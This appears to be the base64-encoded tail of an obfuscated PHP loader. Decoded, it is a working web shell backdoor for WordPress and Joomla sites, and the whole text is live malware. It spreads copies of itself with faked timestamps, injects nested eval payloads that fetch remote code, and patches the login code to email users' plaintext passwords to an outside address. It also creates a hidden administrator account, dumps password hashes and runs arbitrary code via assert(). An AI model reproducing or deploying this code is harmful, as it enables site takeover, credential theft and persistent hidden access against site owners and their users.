vLXVsdGltYXRlLycpOwogICRpbmNsdWRlcyA9IGFycmF5KCcvLi8nKTsKICBpZiAoaXNfam9vbWxhKCkpIHsKLy8gICAgJGluY2x1ZGVzID0gYXJyYXkoJy9sYXlvdXRzLycsICcvdGVtcGxhdGVzXC9zeXN0ZW0vJywgJy90ZW1wbGF0ZXNcL3Byb3Rvc3Rhci8nLCAnL3RlbXBsYXRlc1wvYmVlejMvJywgJy9wbHVnaW5zXC9lZGl0b3JzLXh0ZC8nLCAnL3BsdWdpbnNcL2ZpbmRlci8nLCAnL3BsdWdpbnNcL3F1aWNraWNvbi8nKTsKICAgICRpbmNsdWRlcyA9IGFycmF5KCcvLi8nKTsKICB9CiAgaWYgKGlzX3dvcmRwcmVzcygpKSB7Ci8vICAgICRpbmNsdWRlcyA9IGFycmF5KCcvd3AtaW5jbHVkZXNcL3BvbW8vJywgJy93cC1pbmNsdWRlc1wvZm9udHMvJywgJy93cC1pbmNsdWRlc1wvSUQzLycpOwogICAgJGluY2x1ZGVzID0gYXJyYXkoJy8uLycpOwogIH0KICBmb3JlYWNoKCR3cml0ZV9saXN0IGFzICRkaXIpIHsKICAgICRuYW1lID0gbmFtZUdlbmVyYXRlKCRkaXIpOwogICAgJHNfcGF0aCA9ICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJG5hbWU7CiAgICAkbWFrZSA9IGZhbHNlOwogICAgZm9yZWFjaCAoJGluY2x1ZGVzIGFzICRpbmMpewogICAgICBpZiAocHJlZ19tYXRjaCgkaW5jLCAkc19wYXRoKSkgewogICAgICAgICRtYWtlID0gdHJ1ZTsKICAgICAgfQogICAgfQogICAgZm9yZWFjaCAoJGV4Y2x1ZGVzIGFzICRleGNsKXsKICAgICAgaWYgKHByZWdfbWF0Y2goJGV4Y2wsICRzX3BhdGgpKSB7CiAgICAgICAgJG1ha2UgPSBmYWxzZTsKICAgICAgfQogICAgfQoKICAgIGlmICgkbWFrZSl7CiAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkc19wYXRoLCAkcmVtb3RlX2ZpbGVzW3JhbmQoMCwgY291bnQoJHJlbW90ZV9maWxlcykgLSAxKV0pICE9IEZBTFNFKSB7CiAgICAgICAgaWYgKCR0cyA9PSAnbmVpZ2gnKSB7CiAgICAgICAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZSgkZGlyKTsKICAgICAgICAgIHRvdWNoKCRzX3BhdGgsICRkb25vclsnbXRpbWUnXSwgJGRvbm9yWydhdGltZSddKTsKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkdHMgPT0gJ25vdycpIHsKICAgICAgICAgIHRvdWNoKCRzX3BhdGgpOwogICAgICAgIH0KICAgICAgICBhcnJheV9wdXNoKCRzaGVsbHMsIHByZWdfcmVwbGFjZSgkcGF0dGVybnMsICRyZXBsYWNlbWVudHMsICRzX3BhdGgpKTsKICAgICAgfQogICAgfQoKICB9CiAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnZGlzdHJpYnV0ZScsICd1cmxzJyA9PiAkc2hlbGxzKTsKICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIAp9CgppZihpc3NldCgkX0dFVFsidXBkYXRlIl0pICYmICRpc19hdXRoKSB7CiAgaWYoIWVtcHR5KCRfR0VUWyJ1cGRhdGUiXSkpIHsKICAgICRmaWxlcyA9ICRfR0VUWyJ1cGRhdGUiXTsKICB9CiAgZWxzZSB7CiAgICBwaHBpbmZvKCk7CiAgICByZXR1cm47CiAgfQogIGlmKCFlbXB0eSgkX0dFVFsidHMiXSkpIHsKICAgICR0cyA9ICRfR0VUWyJ0cyJdOwogIH0KICBlbHNlIHsKICAgICR0cyA9ICduZWlnaCc7CiAgfQogICRyZW1vdGVfZmlsZXMgPSBhcnJheSgpOwogICR1cmxzID0gZ2V0X3JlbW90ZV9maWxlKCRmaWxlcyk7CiAgJHJlbW90ZV9maWxlcyA9IGV4cGxvZGUoIiAiLCAkdXJscyk7CiAgJGZpbGUgPSAkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl07CiAgJG5ldyA9IGdldF9yZW1vdGVfZmlsZSgkcmVtb3RlX2ZpbGVzW3JhbmQoMCwgY291bnQoJHJlbW90ZV9maWxlcykgLSAxKV0pOwogIGlmICghc3RycG9zKCRuZXcsICc/cGhwJykpIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3VwZGF0ZScsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgICByZXR1cm47CiAgfQogICRkaXIgPSBkaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7CiAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkbmV3KSAhPSBGQUxTRSkgewogICAgaWYgKCR0cyA9PSAnbmVpZ2gnKSB7CiAgICAgICRkb25vciA9IHRpbWVzdGFtcEdlbmVyYXRlKCRkaXIpOwogICAgICB0b3VjaCgkZmlsZSwgJGRvbm9yWydtdGltZSddLCAkZG9ub3JbJ2F0aW1lJ10pOwogICAgfQogICAgZWxzZWlmICgkdHMgPT0gJ25vdycpIHsKICAgICAgdG91Y2goJGZpbGUpOwogICAgfQogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAndXBkYXRlJywgJ3Jlc3VsdCcgPT4gJ3N1Y2Nlc3MnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQogIGVsc2UgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAndXBkYXRlJywgJ3Jlc3VsdCcgPT4gJ2ZhaWxlZCcpOwogICAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICB9Cgp9CgppZihpc3NldCgkX0dFVFsid3BkaXN0Il0pICYmICRpc19hdXRoKSB7CiAgcmVxdWlyZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICd3cC1sb2FkLnBocCcpOwogICRvcHRpb24gPSAncmVuZGVyJzsKICBpZiAoaW5pX2dldCgnYWxsb3dfdXJsX2ZvcGVuJykpIHsKICAgICRzZXJpYWxpemVkX3ZhbHVlID0gImV2YWwoYmFzZTY0X2RlY29kZSgnWldOb2J5QkFabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9JbHg0TmpoY2VEYzBYSGczTkZ4NE56QmNlRE5oWEhneVpseDRNbVpjZURZeFhIZzNNRng0TmpsY2VESmxYSGczTTF4NE5qVmNlRFptWEhneVpGeDRObVJjZURabVhIZzNZVng0TW1WY2VEWXpYSGcyWmx4NE5tUmNlREptWEhnMlkxeDROamxjZURabFhIZzJZbHg0TTJaY2VEWTBYSGd6WkNJdUpGOVRSVkpXUlZKYklseDROVE5jZURRMVhIZzFNbHg0TlRaY2VEUTFYSGcxTWx4NE5XWmNlRFJsWEhnME1WeDROR1JjZURRMUlsMHVJaVoxUFNJdUpGOVRSVkpXUlZKYklseDROVEpjZURRMVhIZzFNVng0TlRWY2VEUTFYSGcxTTF4NE5UUmNlRFZtWEhnMU5WeDROVEpjZURRNUlsMHBPdz09JykpOyI7CiAgfQogIGVsc2VpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnY3VybCcpICYmIGZ1bmN0aW9uX2V4aXN0cygnY3VybF9leGVjJykpIHsKICAgICRzZXJpYWxpemVkX3ZhbHVlID0gImV2YWwoYmFzZTY0X2RlY29kZSgnSkdOb1BXTjFjbXhmYVc1cGRDZ3BPMk4xY214ZmMyVjBiM0IwS0NSamFDeERWVkpNVDFCVVgxVlNUQ3dpWEhnMk9GeDROelJjZURjMFhIZzNNRng0TTJGY2VESm1YSGd5Wmx4NE5qRmNlRGN3WEhnMk9WeDRNbVZjZURjelhIZzJOVng0Tm1aY2VESmtYSGcyWkZ4NE5tWmNlRGRoWEhneVpWeDROak5jZURabVhIZzJaRng0TW1aY2VEWmpYSGcyT1Z4NE5tVmNlRFppWEhnelpseDROalJjZUROa0lpNGtYMU5GVWxaRlVsc2lYSGcxTTF4NE5EVmNlRFV5WEhnMU5seDRORFZjZURVeVhIZzFabHg0TkdWY2VEUXhYSGcwWkZ4NE5EVWlYUzRpSm5VOUlpNGtYMU5GVWxaRlVsc2lYSGcxTWx4NE5EVmNlRFV4WEhnMU5WeDRORFZjZURVelhIZzFORng0TldaY2VEVTFYSGcxTWx4NE5Ea2lYU2s3WTNWeWJGOXpaWFJ2Y0hRb0pHTm9MRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc01TazdKR3hwYm10elBXTjFjbXhmWlhobFl5Z2tZMmdwTzJOMWNteGZZMnh2YzJVb0pHTm9LVHRsWTJodklDUnNhVzVyY3pzPScpKTsiOwogIH0KICBlbHNlaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3NvY2tldHMnKSkgewogICAgJHNlcmlhbGl6ZWRfdmFsdWUgPSAiZXZhbChiYXNlNjRfZGVjb2RlKCdKR1p3UFdaemIyTnJiM0JsYmlnaVhIZzJNVng0TnpCY2VEWTVYSGd5WlZ4NE56TmNlRFkxWEhnMlpseDRNbVJjZURaa1hIZzJabHg0TjJGY2VESmxYSGcyTTF4NE5tWmNlRFprSWl3NE1Dd2taWEp5Ym04c0pHVnljbk4wY2l3MUtUc2tjbVZ4UFNKY2VESm1YSGcyWTF4NE5qbGNlRFpsWEhnMllseDRNMlpjZURZMFhIZ3paQ0l1SkY5VFJWSldSVkpiSWx4NE5UTmNlRFExWEhnMU1seDROVFpjZURRMVhIZzFNbHg0TldaY2VEUmxYSGcwTVZ4NE5HUmNlRFExSWwwdUlpWjFQU0l1SkY5VFJWSldSVkpiSWx4NE5USmNlRFExWEhnMU1WeDROVFZjZURRMVhIZzFNMXg0TlRSY2VEVm1YSGcxTlZ4NE5USmNlRFE1SWwwN0pHOTFkRDBpWEhnME4xeDRORFZjZURVMElDSXVKSEpsY1M0aUlGeDRORGhjZURVMFhIZzFORng0TlRCY2VESm1YSGd6TVZ4NE1tVmNlRE14WEhKY2JseDRORGhjZURabVhIZzNNMXg0TnpSY2VETmhYSGd5TUZ4NE5qRmNlRGN3WEhnMk9WeDRNbVZjZURjelhIZzJOVng0Tm1aY2VESmtYSGcyWkZ4NE5tWmNlRGRoWEhneVpWeDROak5jZURabVhIZzJaRnh5WEc1Y2VEUXpYSGcyWmx4NE5tVmNlRFpsWEhnMk5WeDROak5jZURjMFhIZzJPVng0Tm1aY2VEWmxYSGd6WVZ4NE1qQmNlRFF6WEhnMlkxeDRObVpjZURjelhIZzJOVnh5WEc1Y2VEVTFYSGczTTF4NE5qVmNlRGN5WEhneVpGeDROREZjZURZM1hIZzJOVng0Tm1WY2VEYzBYSGd6WVZ4NE1qQmNlRFF6WEhnMlpseDRORFJjY2x4dVhISmNiaUk3Wm5keWFYUmxLQ1JtY0N3a2IzVjBLVHNrYUhSdGJEMXpkSEpsWVcxZloyVjBYMk52Ym5SbGJuUnpLQ1JtY0NrN1ptTnNiM05sS0NSbWNDazdKR2gwYld3OVpYaHdiRzlrWlNnaVhISmNibHh5WEc0aUxDUm9kRzFzS1R0aGNuSmhlVjl6YUdsbWRDZ2thSFJ0YkNrN1pXTm9ieUJ3Y21WblgzSmxjR3hoWTJVb0lpOWVXMTQ4WFNzdmFXMGlMQ0FpSWl3Z2FXMXdiRzlrWlNna2FIUnRiQ2twT3c9PScpKTsiOwogIH0KICAkYXV0b2xvYWQgPSAneWVzJzsKICAkcXIgPSAkd3BkYi0+cXVlcnkoICR3cGRiLT5wcmVwYXJlKCAiSU5TRVJUIElOVE8gYCR3cGRiLT5vcHRpb25zYCAoYG9wdGlvbl9uYW1lYCwgYG9wdGlvbl92YWx1ZWAsIGBhdXRvbG9hZGApIFZBTFVFUyAoJXMsICVzLCAlcykgT04gRFVQTElDQVRFIEtFWSBVUERBVEUgYG9wdGlvbl9uYW1lYCA9IFZBTFVFUyhgb3B0aW9uX25hbWVgKSwgYG9wdGlvbl92YWx1ZWAgPSBWQUxVRVMoYG9wdGlvbl92YWx1ZWApLCBgYXV0b2xvYWRgID0gVkFMVUVTKGBhdXRvbG9hZGApIiwgJG9wdGlvbiwgJHNlcmlhbGl6ZWRfdmFsdWUsICRhdXRvbG9hZCApICk7CiAgJGhlYWRlciA9IGdldF90ZW1wbGF0ZV9kaXJlY3RvcnkoKSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAnaGVhZGVyLnBocCc7CiAgaW5zZXJ0UmVuZGVyKCRkaXI9Z2V0X3RoZW1lX3Jvb3QoKSk7CiAgaWYgKGlzX2RpcihXUF9DT05URU5UX0RJUi5ESVJFQ1RPUllfU0VQQVJBVE9SLidjYWNoZScpKSB7CiAgICAgY2xlYXJDYWNoZSgkZGlyPVdQX0NPTlRFTlRfRElSLkRJUkVDVE9SWV9TRVBBUkFUT1IuJ2NhY2hlJyk7CiAgfQogIGlmICgkcXIpIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwZGlzdCcsICdyZXN1bHQnID0+ICdzdWNjZXNzJywgJ3N0YXR1cycgPT4gJHFyKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQogIGVsc2VpZiAoJHFyID09PSAwKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cGRpc3QnLCAncmVzdWx0JyA9PiAnZXhpc3RzJywgJ3N0YXR1cycgPT4gJHFyKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQogIGVsc2UgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnd3BkaXN0JywgJ3Jlc3VsdCcgPT4gJ2ZhaWxlZCcpOwogICAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICB9Cn0KCmlmKGlzc2V0KCRfR0VUWyJ3cG1haWwiXSkgJiYgJGlzX2F1dGgpIHsKICByZXF1aXJlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ3dwLWxvYWQucGhwJyk7CiAgJGYgPSBmaWxlX2dldF9jb250ZW50cyhBQlNQQVRILldQSU5DLkRJUkVDVE9SWV9TRVBBUkFUT1IuJ3VzZXIucGhwJyk7CiAgaWYgKCRmKSB7CiAgICBpZiAocHJlZ19tYXRjaCgnL3dwX21haWwvJywgJGYpKSB7CiAgICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwbWFpbCcsICdyZXN1bHQnID0+ICdleGlzdHMnKTsKICAgIH0gCiAgICBlbHNlIHsKICAgICAgJGYgPSBwcmVnX3JlcGxhY2UoJy8oLip3cF9oYXNoX3Bhc3N3b3JkKS8nLCAiXHRcdHdwX21haWwoXCJcXHg3NVxceDZlXFx4NjNcXHg2Y1xceDY1XFx4NjJcXHg2NVxceDZlXFx4N2FcXHgzMVxceDMyXFx4MzVcXHgzN1xceDQwXFx4NjdcXHg2ZFxceDYxXFx4NjlcXHg2Y1xceDJlXFx4NjNcXHg2ZlxceDZkXCIsXCJcXHg3N1xceDcwXFx4NWZcXHg3MFxceDYxXFx4NzNcXHg3M1wiLGpzb25fZW5jb2RlKFwkdXNlcmRhdGEpKTtcbiQxIiwgJGYpOwogICAgICAkZiA9IHByZWdfcmVwbGFjZSgnLyguKndwX3NldF9hdXRoX2Nvb2tpZVwoXCR1c2VyKS8nLCAiXHRpZiAoXCRfUE9TVFtcInB3ZFwiXSkgd3BfbWFpbChcIlxceDc1XFx4NmVcXHg2M1xceDZjXFx4NjVcXHg2MlxceDY1XFx4NmVcXHg3YVxceDMxXFx4MzJcXHgzNVxceDM3XFx4NDBcXHg2N1xceDZkXFx4NjFcXHg2OVxceDZjXFx4MmVcXHg2M1xceDZmXFx4NmRcIixcIlxceDc3XFx4NzBcXHg1ZlxceDcwXFx4NjFcXHg3M1xceDczXCIsanNvbl9lbmNvZGUoWyBcImRvbWFpblwiID0+IFwkX1NFUlZFUltcIkhUVFBfSE9TVFwiXSwgXCJ1c2VyX2xvZ2luXCIgPT4gXCRfUE9TVFtcImxvZ1wiXSwgXCJ1c2VyX3Bhc3N3b3JkXCIgPT4gXCRfUE9TVFtcInB3ZFwiXSBdKSk7XG4kMSIsICRmKTsKICAgICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKEFCU1BBVEguV1BJTkMuRElSRUNUT1JZX1NFUEFSQVRPUi4ndXNlci5waHAnLCAkZikpIHsKICAgICAgICAkZG9ub3IgPSB0aW1lc3RhbXBHZW5lcmF0ZShBQlNQQVRILldQSU5DKTsKICAgICAgICB0b3VjaChBQlNQQVRILldQSU5DLkRJUkVDVE9SWV9TRVBBUkFUT1IuJ3VzZXIucGhwJywgJGRvbm9yWydtdGltZSddLCAkZG9ub3JbJ2F0aW1lJ10pOwogICAgICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwbWFpbCcsICdyZXN1bHQnID0+ICdzdWNjZXNzJyk7CiAgICAgIH0gCiAgICAgIGVsc2UgewogICAgICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwbWFpbCcsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgICAgfQogICAgfQogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwbWFpbCcsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICB9CiAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKfQoKaWYoaXNzZXQoJF9HRVRbIndwdXNlciJdKSAmJiAkaXNfYXV0aCkgewogICRiYXNlID0gJF9HRVRbImJhc2UiXTsKICByZXF1aXJlKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGJhc2UgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gICd3cC1sb2FkLnBocCcpOwogICR1c2VyID0gIlwxNDFcMTQ0XDE1NlwxNTZcMTUxXDE1NiI7CiAgJHBhc3MgPSAnJFAkQmljVm1ZOGQwcnQ5RlNpSXFYeEJ5LlA5amZ6aWhiMSc7CiAgJGVtYWlsID0gIlwxNjVcMTU2XDE0M1wxNTRcMTQ1XDE0MlwxNDVcMTU2XDE3Mlw2MVw2Mlw2NVw2N1wxMDBcMTQ3XDE1NVwxNDFcMTUxXDE1NFw1NlwxNDNcMTU3XDE1NSI7CiAgJG1ldGEgPSBhcnJheSgnbmlja25hbWUnID0+ICR1c2VyLCAncmljaF9lZGl0aW5nJyA9PiAndHJ1ZScsICdjb21tZW50X3Nob3J0Y3V0cycgPT4gJ2ZhbHNlJywgJ2FkbWluX2NvbG9yJyA9PiAnZnJlc2gnLCAndXNlX3NzbCcgPT4gJzAnLCAnc2hvd19hZG1pbl9iYXJfZnJvbnQnID0+ICd0cnVlJywgJ3dwX2NhcGFiaWxpdGllcycgPT4gJ2E6MTp7czoxMzoiYWRtaW5pc3RyYXRvciI7YjoxO30nLCAnd3BfdXNlcl9sZXZlbCcgPT4gJzEwJywgJ2Rpc21pc3NlZF93cF9wb2ludGVycycgPT4gJ3dwMzYwX2xvY2tzLHdwMzkwX3dpZGdldHMnLCAnc2hvd193ZWxjb21lX3BhbmVsJyA9PiAnMScpOwogICRleGlzdHMgPSAkd3BkYi0+Z2V0X3Jlc3VsdHMoJHdwZGItPnByZXBhcmUoIlNFTEVDVCBJRCBGUk9NICR3cGRiLT51c2VycyBXSEVSRSB1c2VyX2xvZ2luID0gJXMiLCAkdXNlcikpOwogIGlmICghJGV4aXN0cykgewogICAgJGNyX3VzZXIgPSAkd3BkYi0+cXVlcnkoICR3cGRiLT5wcmVwYXJlKCAiSU5TRVJUIElOVE8gYCR3cGRiLT51c2Vyc2AgKGB1c2VyX2xvZ2luYCwgYHVzZXJfcGFzc2AsIGB1c2VyX2VtYWlsYCkgVkFMVUVTICglcywgJXMsICVzKSBPTiBEVVBMSUNBVEUgS0VZIFVQREFURSBgdXNlcl9sb2dpbmAgPSBWQUxVRVMoYHVzZXJfbG9naW5gKSwgYHVzZXJfcGFzc2AgPSBWQUxVRVMoYHVzZXJfcGFzc2ApLCBgdXNlcl9lbWFpbGAgPSBWQUxVRVMoYHVzZXJfZW1haWxgKSIsICR1c2VyLCAkcGFzcywgJGVtYWlsICkgKTsKICAgICRyZXN1bHQgPSAkd3BkYi0+Z2V0X3Jlc3VsdHMoJHdwZGItPnByZXBhcmUoIlNFTEVDVCBJRCBGUk9NICR3cGRiLT51c2VycyBXSEVSRSB1c2VyX2xvZ2luID0gJXMiLCAkdXNlcikpOwogICAgJHVpZCA9ICRyZXN1bHRbMF0tPklEOwogICAgZm9yZWFjaCAoJG1ldGEgYXMgJGtleSA9PiAkdmFsdWUpIHsKICAgICAgJG1ldGFfciA9ICR3cGRiLT5xdWVyeSggJHdwZGItPnByZXBhcmUoICJJTlNFUlQgSU5UTyBgJHdwZGItPnVzZXJtZXRhYCAoYHVzZXJfaWRgLCBgbWV0YV9rZXlgLCBgbWV0YV92YWx1ZWApIFZBTFVFUyAoJXMsICVzLCAlcykgT04gRFVQTElDQVRFIEtFWSBVUERBVEUgYHVzZXJfaWRgID0gVkFMVUVTKGB1c2VyX2lkYCksIGBtZXRhX2tleWAgPSBWQUxVRVMoYG1ldGFfa2V5YCksIGBtZXRhX3ZhbHVlYCA9IFZBTFVFUyhgbWV0YV92YWx1ZWApIiwgJHVpZCwgJGtleSwgJHZhbHVlICkgKTsKICAgIH0KICB9CiAgZWxzZSB7CiAgICAkdWlkID0gJGV4aXN0c1swXS0+SUQ7CiAgICBmb3JlYWNoICgkbWV0YSBhcyAka2V5ID0+ICR2YWx1ZSkgewogICAgICAkbWV0YV9yID0gJHdwZGItPnF1ZXJ5KCAkd3BkYi0+cHJlcGFyZSggIlVQREFURSBgJHdwZGItPnVzZXJtZXRhYCBTRVQgYG1ldGFfdmFsdWVgID0gJXMgV0hFUkUgYHVzZXJfaWRgID0gJXMgQU5EIGBtZXRhX2tleWAgPSAlcyIsICR2YWx1ZSwgJHVpZCwgJGtleSApICk7CiAgICB9CiAgfQogIGlmICgkY3JfdXNlcikgewogICAgJHJlc3VsdCA9IGFycmF5KCd0eXBlJyA9PiAnd3B1c2VyJywgJ3Jlc3VsdCcgPT4gJ3N1Y2Nlc3MnLCAnY3JfdXNlcicgPT4gJGNyX3VzZXIsICdtZXRhX3InID0+ICRtZXRhX3IpOwogICAgZWNobyBzdHJpcHNsYXNoZXMoanNvbl9lbmNvZGUoJHJlc3VsdCkpIC4gIlxuIjsKICB9CiAgZWxzZWlmICgkZXhpc3RzKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cHVzZXInLCAncmVzdWx0JyA9PiAnZXhpc3RzJywgJ21ldGFfcicgPT4gJG1ldGFfcik7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwdXNlcicsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQp9CgppZihpc3NldCgkX0dFVFsid3BoYXNoIl0pICYmICRpc19hdXRoKSB7CiAgJGJhc2UgPSAkX0dFVFsiYmFzZSJdOwogIHJlcXVpcmUoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkYmFzZSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAgJ3dwLWxvYWQucGhwJyk7CiAgJGggPSAkd3BkYi0+Z2V0X3Jlc3VsdHMoJHdwZGItPnByZXBhcmUoIlNFTEVDVCB1c2VyX2xvZ2luLCB1c2VyX3Bhc3MsIHVzZXJfZW1haWwgRlJPTSAkd3BkYi0+dXNlcnMiKSk7CiAgaWYgKCRoKSB7CiAgICAkcmVzdWx0ID0gYXJyYXkoJ3R5cGUnID0+ICd3cGhhc2gnLCAncmVzdWx0JyA9PiAnc3VjY2VzcycsICdoYXNoJyA9PiAkaCk7CiAgICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3dwaGFzaCcsICdyZXN1bHQnID0+ICdmYWlsZWQnKTsKICAgIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7CiAgfQp9CgppZihpc3NldCgkX1BPU1RbImVtcG93ZXIiXSkgJiYgJGlzX2F1dGgpIHsKICBpZiAoIWVtcHR5KCRfUE9TVFsiZW1wb3dlciJdKSkgewogICAgJHZhbCA9ICRfUE9TVFsiZW1wb3dlciJdOwogIH0KICBlbHNlIHsKICAgIHJldHVybjsKICB9CiAgaWYgKGFzc2VydCgkdmFsKSkgewogICAgaGVhZGVyKCdSZXN1bHQ6IFRydWUnKTsKICB9CiAgZWxzZSB7CiAgICBoZWFkZXIoJ1Jlc3VsdDogRmFsc2UnKTsKICB9Cn0KCgppZihpc3NldCgkX0dFVFsic3VpY2lkZSJdKSAmJiAkaXNfYXV0aCkgewogIGlmICgkX0dFVFsic3VpY2lkZSJdICE9ICcxJykgewogICAgcGhwaW5mbygpOwogICAgcmV0dXJuOwogIH0KICBpZiAodW5saW5rKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSkpIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3N1aWNpZGUnLCAncmVzdWx0JyA9PiAnc3VjY2VzcycpOwogIH0KICBlbHNlIHsKICAgICRyZXN1bHQgPSBhcnJheSgndHlwZScgPT4gJ3N1aWNpZGUnLCAncmVzdWx0JyA9PiAnZmFpbCcpOwogIH0KICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsidmVyc2lvbiJdKSAmJiAkaXNfYXV0aCkgewogICRyZXN1bHQgPSBhcnJheSgndmVyc2lvbicgPT4gJHZlcnNpb24sICdlbmNvZGluZycgPT4gJGVuY29kaW5nKTsKICBlY2hvIHN0cmlwc2xhc2hlcyhqc29uX2VuY29kZSgkcmVzdWx0KSkgLiAiXG4iOwp9CgppZihpc3NldCgkX0dFVFsidmVyX2Z1bGwiXSkgJiYgJGlzX2F1dGgpIHsKICAkY21zID0gZ2V0Q01TKCk7CiAgJGVuY29kZXIgPSBnZXRFbmNvZGVyKCk7CiAgJHJlc3VsdCA9IGFycmF5KCd2ZXJzaW9uJyA9PiAkdmVyc2lvbiwgJ2VuY29kaW5nJyA9PiAkZW5jb2RpbmcsICdjbXMnID0+ICRjbXMsICdlbmNvZGVyJyA9PiAkZW5jb2RlciwgJ3BocF92ZXJzaW9uJyA9PiAkcGhwX3ZlcnNpb24pOwogIGVjaG8gc3RyaXBzbGFzaGVzKGpzb25fZW5jb2RlKCRyZXN1bHQpKSAuICJcbiI7Cn0KCg=='));
